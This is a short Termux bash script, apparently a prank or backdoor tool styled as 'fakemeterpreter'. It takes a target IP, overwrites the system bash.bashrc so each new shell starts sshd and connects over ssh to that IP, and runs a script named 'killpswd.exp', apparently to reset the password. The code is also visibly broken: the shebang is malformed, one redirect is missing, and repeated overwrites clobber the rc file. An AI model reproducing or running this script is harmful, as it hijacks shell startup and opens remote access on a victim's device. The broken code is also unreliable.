#!bin/bash
user=$(whoami)
ifconfig
read -p "fakemeterpreter> " ip
echo -e "sshd\n" > "/data/data/com.termux/files/usr/etc/bash.bashrc"
echo -e "expect login.exp\n" "/data/data/com.termux/files/usr/etc/bash.bashrc"
echo -e "ssh $user@$ip -p 8022\n" > "/data/data/com.termux/files/usr/etc/bash.bashrc"
apt-get install openssh -y
apt-get install termux-auth -y
apt-get install expect -y
apt-get install sed -y
echo -e "passwd \n sshd \n ssh $user@$ip -p 8022 \n" > sshloader.sh
chmod +x *
expect killpswd.exp
